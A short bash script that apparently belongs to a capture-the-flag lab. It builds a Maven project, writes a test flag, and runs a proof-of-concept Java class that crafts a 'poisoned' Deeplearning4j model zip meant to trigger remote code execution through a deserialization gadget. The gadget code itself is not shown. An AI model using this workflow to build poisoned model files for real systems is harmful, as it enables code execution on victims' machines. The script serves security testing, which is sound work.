#!/bin/bash
# maven container (temurin-11): compile + craft poisoned model + dump runtime classpath.
# DL4J-scoped gadget; Java 11 needs no --add-opens.
set -eu
cd /payload
mkdir -p /work/out
echo 'HTB{t3st_dl4j_pr3pr0c3ss0r_d3s3r}' > /work/out/flag.txt
rm -f /work/out/loot.txt /work/out/loot.txt.ran

mvn -q -B compile
mvn -q -B dependency:build-classpath -Dmdep.outputFile=/work/cp.txt
mvn -q -B exec:java \
  -Dexec.mainClass=local.poc.SignetryPayload \
  -Dexec.args="/work/out/model-rce.zip /work/out/flag.txt /work/out/blob.bin"
echo "GEN_DONE size=$(stat -c%s /work/out/model-rce.zip)"
